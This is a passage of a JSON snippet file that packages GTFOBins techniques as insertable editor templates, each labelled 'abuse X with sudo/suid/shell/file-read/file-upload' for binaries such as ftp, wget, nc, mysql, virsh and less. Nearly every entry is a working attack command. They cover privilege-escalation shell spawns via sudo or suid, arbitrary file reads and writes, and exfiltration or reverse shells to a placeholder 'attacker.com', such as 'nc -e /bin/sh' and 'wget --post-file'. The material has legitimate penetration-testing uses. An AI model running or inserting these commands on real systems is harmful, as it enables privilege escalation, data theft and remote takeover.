        "description": "abuse octave with limited-suid"
    },
    "ftp shell (gtfobins)": {
        "prefix": "ftp shell",
        "body": [
            "abuse ftp with shell",
            "",
            "```sh",
            "ftp",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse ftp with shell"
    },
    "ftp file-upload (gtfobins)": {
        "prefix": "ftp file-upload",
        "body": [
            "abuse ftp with file-upload, Send local file to a FTP server.",
            "",
            "```sh",
            "RHOST=${2:attacker.com}",
            "ftp \\$RHOST",
            "put ${1:file_to_send}${0}",
            "```"
        ],
        "description": "abuse ftp with file-upload - Send local file to a FTP server."
    },
    "ftp file-download (gtfobins)": {
        "prefix": "ftp file-download",
        "body": [
            "abuse ftp with file-download, Fetch a remote file from a FTP server.",
            "",
            "```sh",
            "RHOST=${1:attacker.com}",
            "ftp \\$RHOST",
            "get file_to_get${0}",
            "```"
        ],
        "description": "abuse ftp with file-download - Fetch a remote file from a FTP server."
    },
    "ftp sudo (gtfobins)": {
        "prefix": "ftp sudo",
        "body": [
            "abuse ftp with sudo",
            "",
            "```sh",
            "sudo ftp",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse ftp with sudo"
    },
    "virsh sudo (gtfobins)": {
        "prefix": "virsh sudo",
        "body": [
            "abuse virsh with sudo",
            "",
            "```sh",
            "SCRIPT=script_to_run",
            "TF=\\$(mktemp)",
            "cat > \\$TF << EOF",
            "<domain type='kvm'>",
            "  <name>x</name>",
            "  <os>",
            "    <type arch='x86_64'>hvm</type>",
            "  </os>",
            "  <memory unit='KiB'>1</memory>",
            "  <devices>",
            "    <interface type='ethernet'>",
            "      <script path='\\$SCRIPT'/>",
            "    </interface>",
            "  </devices>",
            "</domain>",
            "EOF",
            "sudo virsh -c qemu:///system create \\$TF",
            "virsh -c qemu:///system destroy x${0}",
            "```"
        ],
        "description": "abuse virsh with sudo"
    },
    "virsh file-write (gtfobins)": {
        "prefix": "virsh file-write",
        "body": [
            "abuse virsh with file-write, This requires the user to be in the `libvirt` group to perform privileged file write. If the target directory doesn't exist, `pool-create-as` must be run with the `--build` option. The destination file ownership and permissions can be set in the XML.",
            "",
            "```sh",
            "LFILE_DIR=/root",
            "LFILE_NAME=${1:file_to_write}",
            "echo 'data' > data_to_write",
            "TF=\\$(mktemp)",
            "cat > \\$TF <<EOF",
            "<volume type='file'>",
            "  <name>y</name>",
            "  <key>\\$LFILE_DIR/\\$LFILE_NAME</key>",
            "  <source>",
            "  </source>",
            "  <capacity unit='bytes'>5</capacity>",
            "  <allocation unit='bytes'>4096</allocation>",
            "  <physical unit='bytes'>5</physical>",
            "  <target>",
            "    <path>\\$LFILE_DIR/\\$LFILE_NAME</path>",
            "    <format type='raw'/>",
            "    <permissions>",
            "      <mode>0600</mode>",
            "      <owner>0</owner>",
            "      <group>0</group>",
            "    </permissions>",
            "  </target>",
            "</volume>",
            "EOF",
            "virsh -c qemu:///system pool-create-as x dir --target \\$LFILE_DIR",
            "virsh -c qemu:///system vol-create --pool x --file \\$TF",
            "virsh -c qemu:///system vol-upload --pool x \\$LFILE_DIR/\\$LFILE_NAME data_to_write",
            "virsh -c qemu:///system pool-destroy x${0}",
            "```"
        ],
        "description": "abuse virsh with file-write - This requires the user to be in the `libvirt` group to perform privileged file write. If the target directory doesn't exist, `pool-create-as` must be run with the `--build` option. The destination file ownership and permissions can be set in the XML."
    },
    "virsh file-read (gtfobins)": {
        "prefix": "virsh file-read",
        "body": [
            "abuse virsh with file-read, This requires the user to be in the `libvirt` group to perform privileged file read.",
            "",
            "```sh",
            "LFILE_DIR=/root",
            "LFILE_NAME=${1:file_to_read}",
            "SPATH=${2:file_to_save}",
            "virsh -c qemu:///system pool-create-as x dir --target \\$LFILE_DIR",
            "virsh -c qemu:///system vol-download --pool x \\$LFILE_NAME \\$SPATH",
            "virsh -c qemu:///system pool-destroy x${0}",
            "```"
        ],
        "description": "abuse virsh with file-read - This requires the user to be in the `libvirt` group to perform privileged file read."
    },
    "date file-read (gtfobins)": {
        "prefix": "date file-read",
        "body": [
            "abuse date with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "date -f \\$LFILE${0}",
            "```"
        ],
        "description": "abuse date with file-read"
    },
    "date suid (gtfobins)": {
        "prefix": "date suid",
        "body": [
            "abuse date with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./date -f \\$LFILE${0}",
            "```"
        ],
        "description": "abuse date with suid"
    },
    "date sudo (gtfobins)": {
        "prefix": "date sudo",
        "body": [
            "abuse date with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo date -f \\$LFILE${0}",
            "```"
        ],
        "description": "abuse date with sudo"
    },
    "mosquitto file-read (gtfobins)": {
        "prefix": "mosquitto file-read",
        "body": [
            "abuse mosquitto with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "mosquitto -c \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse mosquitto with file-read"
    },
    "mosquitto suid (gtfobins)": {
        "prefix": "mosquitto suid",
        "body": [
            "abuse mosquitto with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./mosquitto -c \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse mosquitto with suid"
    },
    "mosquitto sudo (gtfobins)": {
        "prefix": "mosquitto sudo",
        "body": [
            "abuse mosquitto with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo mosquitto -c \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse mosquitto with sudo"
    },
    "opkg sudo (gtfobins)": {
        "prefix": "opkg sudo",
        "body": [
            "abuse opkg with sudo, \nIt runs an interactive shell using a specially crafted Debian package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n\n```\n\nTF=$(mktemp -d)\n\necho 'exec /bin/sh' > $TF/x.sh\n\nfpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF\n\n```\n",
            "",
            "```sh",
            "sudo opkg install x_1.0_all.deb${0}",
            "```"
        ],
        "description": "abuse opkg with sudo - \nIt runs an interactive shell using a specially crafted Debian package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n\n```\n\nTF=$(mktemp -d)\n\necho 'exec /bin/sh' > $TF/x.sh\n\nfpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF\n\n```\n"
    },
    "tac file-read (gtfobins)": {
        "prefix": "tac file-read",
        "body": [
            "abuse tac with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "tac -s 'RANDOM' \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse tac with file-read"
    },
    "tac suid (gtfobins)": {
        "prefix": "tac suid",
        "body": [
            "abuse tac with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./tac -s 'RANDOM' \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse tac with suid"
    },
    "tac sudo (gtfobins)": {
        "prefix": "tac sudo",
        "body": [
            "abuse tac with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo tac -s 'RANDOM' \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse tac with sudo"
    },
    "wget shell (gtfobins)": {
        "prefix": "wget shell",
        "body": [
            "abuse wget with shell",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "chmod +x \\$TF",
            "echo -e '#!/bin/sh\\n/bin/sh 1>&0' >\\$TF",
            "wget --use-askpass=\\$TF 0${0}",
            "```"
        ],
        "description": "abuse wget with shell"
    },
    "wget file-upload (gtfobins)": {
        "prefix": "wget file-upload",
        "body": [
            "abuse wget with file-upload, Send local file with an HTTP POST request. Run an HTTP service on the attacker box to collect the file. Note that the file will be sent as-is, instruct the service to not URL-decode the body. Use `--post-data` to send hard-coded data.",
            "",
            "```sh",
            "URL=http://${2:attacker.com}/",
            "LFILE=${1:file_to_send}",
            "wget --post-file=\\$LFILE \\$URL${0}",
            "```"
        ],
        "description": "abuse wget with file-upload - Send local file with an HTTP POST request. Run an HTTP service on the attacker box to collect the file. Note that the file will be sent as-is, instruct the service to not URL-decode the body. Use `--post-data` to send hard-coded data."
    },
    "wget file-read (gtfobins)": {
        "prefix": "wget file-read",
        "body": [
            "abuse wget with file-read, The file to be read is treated as a list of URLs, one per line, which are actually fetched by `wget`. The content appears, somewhat modified, as error messages, thus this is not suitable to read arbitrary binary data.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "wget -i \\$LFILE${0}",
            "```"
        ],
        "description": "abuse wget with file-read - The file to be read is treated as a list of URLs, one per line, which are actually fetched by `wget`. The content appears, somewhat modified, as error messages, thus this is not suitable to read arbitrary binary data."
    },
    "wget file-write (gtfobins)": {
        "prefix": "wget file-write",
        "body": [
            "abuse wget with file-write, The data to be written is treated as a list of URLs, one per line, which are actually fetched by `wget`. The data is written, somewhat modified, as error messages, thus this is not suitable to write arbitrary binary data.",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "TF=\\$(mktemp)",
            "echo DATA > \\$TF",
            "wget -i \\$TF -o \\$LFILE${0}",
            "```"
        ],
        "description": "abuse wget with file-write - The data to be written is treated as a list of URLs, one per line, which are actually fetched by `wget`. The data is written, somewhat modified, as error messages, thus this is not suitable to write arbitrary binary data."
    },
    "wget file-download (gtfobins)": {
        "prefix": "wget file-download",
        "body": [
            "abuse wget with file-download, Fetch a remote file via HTTP GET request.",
            "",
            "```sh",
            "URL=http://${2:attacker.com}/file_to_get",
            "LFILE=${1:file_to_save}",
            "wget \\$URL -O \\$LFILE${0}",
            "```"
        ],
        "description": "abuse wget with file-download - Fetch a remote file via HTTP GET request."
    },
    "wget suid (gtfobins)": {
        "prefix": "wget suid",
        "body": [
            "abuse wget with suid",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "chmod +x \\$TF",
            "echo -e '#!/bin/sh -p\\n/bin/sh -p 1>&0' >\\$TF",
            "./wget --use-askpass=\\$TF 0${0}",
            "```"
        ],
        "description": "abuse wget with suid"
    },
    "wget sudo (gtfobins)": {
        "prefix": "wget sudo",
        "body": [
            "abuse wget with sudo",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "chmod +x \\$TF",
            "echo -e '#!/bin/sh\\n/bin/sh 1>&0' >\\$TF",
            "sudo wget --use-askpass=\\$TF 0${0}",
            "```"
        ],
        "description": "abuse wget with sudo"
    },
    "run-mailcap shell (gtfobins)": {
        "prefix": "run-mailcap shell",
        "body": [
            "abuse run-mailcap with shell, This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
            "",
            "```sh",
            "run-mailcap --action=view /etc/hosts",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse run-mailcap with shell - This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
    },
    "run-mailcap file-read (gtfobins)": {
        "prefix": "run-mailcap file-read",
        "body": [
            "abuse run-mailcap with file-read, This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
            "",
            "```sh",
            "run-mailcap --action=view ${1:file_to_read}${0}",
            "```"
        ],
        "description": "abuse run-mailcap with file-read - This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
    },
    "run-mailcap file-write (gtfobins)": {
        "prefix": "run-mailcap file-write",
        "body": [
            "abuse run-mailcap with file-write, \nThe file must exist and be not empty.\n\n\n\nThis invokes the default editor, which is likely to be [`vi`](/gtfobins/vi/), other functions may apply.\n",
            "",
            "```sh",
            "run-mailcap --action=edit ${1:file_to_read}${0}",
            "```"
        ],
        "description": "abuse run-mailcap with file-write - \nThe file must exist and be not empty.\n\n\n\nThis invokes the default editor, which is likely to be [`vi`](/gtfobins/vi/), other functions may apply.\n"
    },
    "run-mailcap sudo (gtfobins)": {
        "prefix": "run-mailcap sudo",
        "body": [
            "abuse run-mailcap with sudo, This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
            "",
            "```sh",
            "sudo run-mailcap --action=view /etc/hosts",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse run-mailcap with sudo - This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
    },
    "start-stop-daemon shell (gtfobins)": {
        "prefix": "start-stop-daemon shell",
        "body": [
            "abuse start-stop-daemon with shell",
            "",
            "```sh",
            "start-stop-daemon -n \\$RANDOM -S -x /bin/sh${0}",
            "```"
        ],
        "description": "abuse start-stop-daemon with shell"
    },
    "start-stop-daemon suid (gtfobins)": {
        "prefix": "start-stop-daemon suid",
        "body": [
            "abuse start-stop-daemon with suid",
            "",
            "```sh",
            "./start-stop-daemon -n \\$RANDOM -S -x /bin/sh -- -p${0}",
            "```"
        ],
        "description": "abuse start-stop-daemon with suid"
    },
    "start-stop-daemon sudo (gtfobins)": {
        "prefix": "start-stop-daemon sudo",
        "body": [
            "abuse start-stop-daemon with sudo",
            "",
            "```sh",
            "sudo start-stop-daemon -n \\$RANDOM -S -x /bin/sh${0}",
            "```"
        ],
        "description": "abuse start-stop-daemon with sudo"
    },
    "finger file-upload (gtfobins)": {
        "prefix": "finger file-upload",
        "body": [
            "abuse finger with file-upload, Send a binary file to a TCP port. Run `sudo nc -l -p 79 | base64 -d > \"file_to_save\"` on the attacker box to collect the file. The file length is limited by the maximum size of arguments.",
            "",
            "```sh",
            "RHOST=${2:attacker.com}",
            "LFILE=${1:file_to_send}",
            "finger \"\\$(base64 \\$LFILE)@\\$RHOST\"${0}",
            "```"
        ],
        "description": "abuse finger with file-upload - Send a binary file to a TCP port. Run `sudo nc -l -p 79 | base64 -d > \"file_to_save\"` on the attacker box to collect the file. The file length is limited by the maximum size of arguments."
    },
    "finger file-download (gtfobins)": {
        "prefix": "finger file-download",
        "body": [
            "abuse finger with file-download, Fetch remote binary file from a remote TCP port. Run `base64 \"file_to_send\" | sudo nc -l -p 79` on the attacker box to send the file.",
            "",
            "```sh",
            "RHOST=${2:attacker.com}",
            "LFILE=${1:file_to_save}",
            "finger x@\\$RHOST | base64 -d > \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse finger with file-download - Fetch remote binary file from a remote TCP port. Run `base64 \"file_to_send\" | sudo nc -l -p 79` on the attacker box to send the file."
    },
    "psftp shell (gtfobins)": {
        "prefix": "psftp shell",
        "body": [
            "abuse psftp with shell",
            "",
            "```sh",
            "psftp",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse psftp with shell"
    },
    "psftp limited-suid (gtfobins)": {
        "prefix": "psftp limited-suid",
        "body": [
            "abuse psftp with limited-suid",
            "",
            "```sh",
            "sudo psftp",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse psftp with limited-suid"
    },
    "psftp sudo (gtfobins)": {
        "prefix": "psftp sudo",
        "body": [
            "abuse psftp with sudo",
            "",
            "```sh",
            "sudo psftp",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse psftp with sudo"
    },
    "mysql shell (gtfobins)": {
        "prefix": "mysql shell",
        "body": [
            "abuse mysql with shell",
            "",
            "```sh",
            "mysql -e '\\! /bin/sh'${0}",
            "```"
        ],
        "description": "abuse mysql with shell"
    },
    "mysql sudo (gtfobins)": {
        "prefix": "mysql sudo",
        "body": [
            "abuse mysql with sudo",
            "",
            "```sh",
            "sudo mysql -e '\\! /bin/sh'${0}",
            "```"
        ],
        "description": "abuse mysql with sudo"
    },
    "mysql limited-suid (gtfobins)": {
        "prefix": "mysql limited-suid",
        "body": [
            "abuse mysql with limited-suid",
            "",
            "```sh",
            "./mysql -e '\\! /bin/sh'${0}",
            "```"
        ],
        "description": "abuse mysql with limited-suid"
    },
    "mysql library-load (gtfobins)": {
        "prefix": "mysql library-load",
        "body": [
            "abuse mysql with library-load, \nA MySQL server must accept connections in order for this to work.\n\n\n\nThe following loads the `/path/to/lib.so` shared object.\n",
            "",
            "```sh",
            "mysql --default-auth ../../../../../path/to/lib${0}",
            "```"
        ],
        "description": "abuse mysql with library-load - \nA MySQL server must accept connections in order for this to work.\n\n\n\nThe following loads the `/path/to/lib.so` shared object.\n"
    },
    "fping file-read (gtfobins)": {
        "prefix": "fping file-read",
        "body": [
            "abuse fping with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "fping -f \\$LFILE${0}",
            "```"
        ],
        "description": "abuse fping with file-read"
    },
    "fping sudo (gtfobins)": {
        "prefix": "fping sudo",
        "body": [
            "abuse fping with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo fping -f \\$LFILE${0}",
            "```"
        ],
        "description": "abuse fping with sudo"
    },
    "whiptail file-read (gtfobins)": {
        "prefix": "whiptail file-read",
        "body": [
            "abuse whiptail with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "whiptail --textbox --scrolltext \"\\$LFILE\" 0 0${0}",
            "```"
        ],
        "description": "abuse whiptail with file-read"
    },
    "whiptail suid (gtfobins)": {
        "prefix": "whiptail suid",
        "body": [
            "abuse whiptail with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./whiptail --textbox --scrolltext \"\\$LFILE\" 0 0${0}",
            "```"
        ],
        "description": "abuse whiptail with suid"
    },
    "whiptail sudo (gtfobins)": {
        "prefix": "whiptail sudo",
        "body": [
            "abuse whiptail with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo whiptail --textbox --scrolltext \"\\$LFILE\" 0 0${0}",
            "```"
        ],
        "description": "abuse whiptail with sudo"
    },
    "gcore file-read (gtfobins)": {
        "prefix": "gcore file-read",
        "body": [
            "abuse gcore with file-read",
            "",
            "```sh",
            "gcore \\$PID${0}",
            "```"
        ],
        "description": "abuse gcore with file-read"
    },
    "gcore sudo (gtfobins)": {
        "prefix": "gcore sudo",
        "body": [
            "abuse gcore with sudo",
            "",
            "```sh",
            "sudo gcore \\$PID${0}",
            "```"
        ],
        "description": "abuse gcore with sudo"
    },
    "gcore suid (gtfobins)": {
        "prefix": "gcore suid",
        "body": [
            "abuse gcore with suid",
            "",
            "```sh",
            "./gcore \\$PID${0}",
            "```"
        ],
        "description": "abuse gcore with suid"
    },
    "check_ssl_cert command (gtfobins)": {
        "prefix": "check_ssl_cert command",
        "body": [
            "abuse check_ssl_cert with command, The host example.net must return a certificate via TLS",
            "",
            "```sh",
            "COMMAND=id",
            "OUTPUT=output_file",
            "TF=\\$(mktemp)",
            "echo \"\\$COMMAND | tee \\$OUTPUT\" > \\$TF",
            "chmod +x \\$TF",
            "check_ssl_cert --curl-bin \\$TF -H example.net",
            "cat \\$OUTPUT${0}",
            "```"
        ],
        "description": "abuse check_ssl_cert with command - The host example.net must return a certificate via TLS"
    },
    "check_ssl_cert sudo (gtfobins)": {
        "prefix": "check_ssl_cert sudo",
        "body": [
            "abuse check_ssl_cert with sudo, The host example.net must return a certificate via TLS",
            "",
            "```sh",
            "COMMAND=id",
            "OUTPUT=output_file",
            "TF=\\$(mktemp)",
            "echo \"\\$COMMAND | tee \\$OUTPUT\" > \\$TF",
            "chmod +x \\$TF",
            "umask 022",
            "check_ssl_cert --curl-bin \\$TF -H example.net",
            "cat \\$OUTPUT${0}",
            "```"
        ],
        "description": "abuse check_ssl_cert with sudo - The host example.net must return a certificate via TLS"
    },
    "aspell file-read (gtfobins)": {
        "prefix": "aspell file-read",
        "body": [
            "abuse aspell with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "aspell -c \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse aspell with file-read"
    },
    "aspell suid (gtfobins)": {
        "prefix": "aspell suid",
        "body": [
            "abuse aspell with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./aspell -c \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse aspell with suid"
    },
    "aspell sudo (gtfobins)": {
        "prefix": "aspell sudo",
        "body": [
            "abuse aspell with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo aspell -c \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse aspell with sudo"
    },
    "torify shell (gtfobins)": {
        "prefix": "torify shell",
        "body": [
            "abuse torify with shell",
            "",
            "```sh",
            "torify /bin/sh${0}",
            "```"
        ],
        "description": "abuse torify with shell"
    },
    "torify sudo (gtfobins)": {
        "prefix": "torify sudo",
        "body": [
            "abuse torify with sudo",
            "",
            "```sh",
            "sudo torify /bin/sh${0}",
            "```"
        ],
        "description": "abuse torify with sudo"
    },
    "kubectl file-upload (gtfobins)": {
        "prefix": "kubectl file-upload",
        "body": [
            "abuse kubectl with file-upload",
            "",
            "```sh",
            "LFILE=dir_to_serve",
            "kubectl proxy --address=0.0.0.0 --port=4444 --www=\\$LFILE --www-prefix=/x/${0}",
            "```"
        ],
        "description": "abuse kubectl with file-upload"
    },
    "kubectl suid (gtfobins)": {
        "prefix": "kubectl suid",
        "body": [
            "abuse kubectl with suid",
            "",
            "```sh",
            "LFILE=dir_to_serve",
            "./kubectl proxy --address=0.0.0.0 --port=4444 --www=\\$LFILE --www-prefix=/x/${0}",
            "```"
        ],
        "description": "abuse kubectl with suid"
    },
    "kubectl sudo (gtfobins)": {
        "prefix": "kubectl sudo",
        "body": [
            "abuse kubectl with sudo",
            "",
            "```sh",
            "LFILE=dir_to_serve",
            "sudo kubectl proxy --address=0.0.0.0 --port=4444 --www=\\$LFILE --www-prefix=/x/${0}",
            "```"
        ],
        "description": "abuse kubectl with sudo"
    },
    "column file-read (gtfobins)": {
        "prefix": "column file-read",
        "body": [
            "abuse column with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "column \\$LFILE${0}",
            "```"
        ],
        "description": "abuse column with file-read"
    },
    "column suid (gtfobins)": {
        "prefix": "column suid",
        "body": [
            "abuse column with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./column \\$LFILE${0}",
            "```"
        ],
        "description": "abuse column with suid"
    },
    "column sudo (gtfobins)": {
        "prefix": "column sudo",
        "body": [
            "abuse column with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo column \\$LFILE${0}",
            "```"
        ],
        "description": "abuse column with sudo"
    },
    "pkexec sudo (gtfobins)": {
        "prefix": "pkexec sudo",
        "body": [
            "abuse pkexec with sudo",
            "",
            "```sh",
            "sudo pkexec /bin/sh${0}",
            "```"
        ],
        "description": "abuse pkexec with sudo"
    },
    "apache2ctl file-read (gtfobins)": {
        "prefix": "apache2ctl file-read",
        "body": [
            "abuse apache2ctl with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "apache2ctl -c \"Include \\$LFILE\" -k stop${0}",
            "```"
        ],
        "description": "abuse apache2ctl with file-read"
    },
    "apache2ctl sudo (gtfobins)": {
        "prefix": "apache2ctl sudo",
        "body": [
            "abuse apache2ctl with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo apache2ctl -c \"Include \\$LFILE\" -k stop${0}",
            "```"
        ],
        "description": "abuse apache2ctl with sudo"
    },
    "nc reverse-shell (gtfobins)": {
        "prefix": "nc reverse-shell",
        "body": [
            "abuse nc with reverse-shell, Run `nc -l -p 12345` on the attacker box to receive the shell. This only works with netcat traditional.",
            "",
            "```sh",
            "RHOST=${1:attacker.com}",
            "RPORT=${2:12345}",
            "nc -e /bin/sh \\$RHOST \\$RPORT${0}",
            "```"
        ],
        "description": "abuse nc with reverse-shell - Run `nc -l -p 12345` on the attacker box to receive the shell. This only works with netcat traditional."
    },
    "nc bind-shell (gtfobins)": {
        "prefix": "nc bind-shell",
        "body": [
            "abuse nc with bind-shell, Run `nc target.com 12345` on the attacker box to connect to the shell. This only works with netcat traditional.",
            "",
            "```sh",
            "LPORT=${1:12345}",
            "nc -l -p \\$LPORT -e /bin/sh${0}",
            "```"
        ],
        "description": "abuse nc with bind-shell - Run `nc target.com 12345` on the attacker box to connect to the shell. This only works with netcat traditional."
    },
    "nc file-upload (gtfobins)": {
        "prefix": "nc file-upload",
        "body": [
            "abuse nc with file-upload, Send a local file via TCP. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file.",
            "",
            "```sh",
            "RHOST=${2:attacker.com}",
            "RPORT=${3:12345}",
            "LFILE=${1:file_to_send}",
            "nc \\$RHOST \\$RPORT < \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse nc with file-upload - Send a local file via TCP. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file."
    },
    "nc file-download (gtfobins)": {
        "prefix": "nc file-download",
        "body": [
            "abuse nc with file-download, Fetch a remote file via TCP. Run `nc target.com 12345 < \"file_to_send\"` on the attacker box to send the file.",
            "",
            "```sh",
            "LPORT=${2:12345}",
            "LFILE=${1:file_to_save}",
            "nc -l -p \\$LPORT > \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse nc with file-download - Fetch a remote file via TCP. Run `nc target.com 12345 < \"file_to_send\"` on the attacker box to send the file."
    },
    "nc sudo (gtfobins)": {
        "prefix": "nc sudo",
        "body": [
            "abuse nc with sudo, Run `nc -l -p 12345` on the attacker box to receive the shell. This only works with netcat traditional.",
            "",
            "```sh",
            "RHOST=${1:attacker.com}",
            "RPORT=${2:12345}",
            "sudo nc -e /bin/sh \\$RHOST \\$RPORT${0}",
            "```"
        ],
        "description": "abuse nc with sudo - Run `nc -l -p 12345` on the attacker box to receive the shell. This only works with netcat traditional."
    },
    "nc limited-suid (gtfobins)": {
        "prefix": "nc limited-suid",
        "body": [
            "abuse nc with limited-suid, Run `nc -l -p 12345` on the attacker box to receive the shell. This only works with netcat traditional.",
            "",
            "```sh",
            "RHOST=${1:attacker.com}",
            "RPORT=${2:12345}",
            "./nc -e /bin/sh \\$RHOST \\$RPORT${0}",
            "```"
        ],
        "description": "abuse nc with limited-suid - Run `nc -l -p 12345` on the attacker box to receive the shell. This only works with netcat traditional."
    },
    "lftp shell (gtfobins)": {
        "prefix": "lftp shell",
        "body": [
            "abuse lftp with shell",
            "",
            "```sh",
            "lftp -c '!/bin/sh'${0}",
            "```"
        ],
        "description": "abuse lftp with shell"
    },
    "lftp limited-suid (gtfobins)": {
        "prefix": "lftp limited-suid",
        "body": [
            "abuse lftp with limited-suid",
            "",
            "```sh",
            "./lftp -c '!/bin/sh'${0}",
            "```"
        ],
        "description": "abuse lftp with limited-suid"
    },
    "lftp sudo (gtfobins)": {
        "prefix": "lftp sudo",
        "body": [
            "abuse lftp with sudo",
            "",
            "```sh",
            "sudo lftp -c '!/bin/sh'${0}",
            "```"
        ],
        "description": "abuse lftp with sudo"
    },
    "gtester file-write (gtfobins)": {
        "prefix": "gtester file-write",
        "body": [
            "abuse gtester with file-write, Data to be written appears in an XML attribute in the output file (`<testbinary path=\"DATA\">`).",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "gtester \"DATA\" -o \\$LFILE${0}",
            "```"
        ],
        "description": "abuse gtester with file-write - Data to be written appears in an XML attribute in the output file (`<testbinary path=\"DATA\">`)."
    },
    "gtester shell (gtfobins)": {
        "prefix": "gtester shell",
        "body": [
            "abuse gtester with shell",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo '#!/bin/sh' > \\$TF",
            "echo 'exec /bin/sh -p 0<&1' >> \\$TF",
            "chmod +x \\$TF",
            "gtester -q \\$TF${0}",
            "```"
        ],
        "description": "abuse gtester with shell"
    },
    "gtester sudo (gtfobins)": {
        "prefix": "gtester sudo",
        "body": [
            "abuse gtester with sudo",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo '#!/bin/sh' > \\$TF",
            "echo 'exec /bin/sh 0<&1' >> \\$TF",
            "chmod +x \\$TF",
            "sudo gtester -q \\$TF${0}",
            "```"
        ],
        "description": "abuse gtester with sudo"
    },
    "gtester suid (gtfobins)": {
        "prefix": "gtester suid",
        "body": [
            "abuse gtester with suid",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo '#!/bin/sh -p' > \\$TF",
            "echo 'exec /bin/sh -p 0<&1' >> \\$TF",
            "chmod +x \\$TF",
            "sudo gtester -q \\$TF${0}",
            "```"
        ],
        "description": "abuse gtester with suid"
    },
    "fold file-read (gtfobins)": {
        "prefix": "fold file-read",
        "body": [
            "abuse fold with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "fold -w99999999 \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse fold with file-read"
    },
    "fold suid (gtfobins)": {
        "prefix": "fold suid",
        "body": [
            "abuse fold with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./fold -w99999999 \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse fold with suid"
    },
    "fold sudo (gtfobins)": {
        "prefix": "fold sudo",
        "body": [
            "abuse fold with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo fold -w99999999 \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse fold with sudo"
    },
    "less shell (gtfobins)": {
        "prefix": "less shell",
        "body": [
            "abuse less with shell",
            "",
            "```sh",
            "less /etc/profile",
            "v:shell${0}",
            "```"
        ],
        "description": "abuse less with shell"
    },
    "less file-read (gtfobins)": {
        "prefix": "less file-read",
        "body": [
            "abuse less with file-read, This is useful when `less` is used as a pager by another binary to read a different file.",
            "",
            "```sh",
            "less /etc/profile",
            ":e ${1:file_to_read}${0}",
            "```"
        ],
        "description": "abuse less with file-read - This is useful when `less` is used as a pager by another binary to read a different file."
    },
    "less file-write (gtfobins)": {
        "prefix": "less file-write",
        "body": [
            "abuse less with file-write, This invokes the default editor to edit the file. The file must exist.",
            "",
            "```sh",
            "less ${1:file_to_write}",
            "v${0}",
            "```"
        ],
        "description": "abuse less with file-write - This invokes the default editor to edit the file. The file must exist."
    },
    "less sudo (gtfobins)": {
        "prefix": "less sudo",
